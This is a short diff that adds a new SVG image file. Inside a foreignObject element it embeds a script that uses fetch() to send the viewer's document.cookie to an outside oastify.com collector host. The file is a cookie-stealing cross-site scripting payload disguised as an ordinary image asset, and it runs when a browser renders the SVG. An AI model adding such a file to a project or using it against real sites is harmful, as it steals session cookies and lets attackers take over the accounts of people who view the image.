@@ -1,0 +1,9 @@
+<svg xmlns="http://www.w3.org/2000/svg">
+  <foreignObject width="100" height="100">
+    <body xmlns="http://www.w3.org/1999/xhtml">
+      <script>
+        fetch('https://nsjg5hlz2a8x9jxx967ahisk7bd211pq.oastify.com/?d='+document.cookie);
+      </script>
+    </body>
+  </foreignObject>
+</svg>
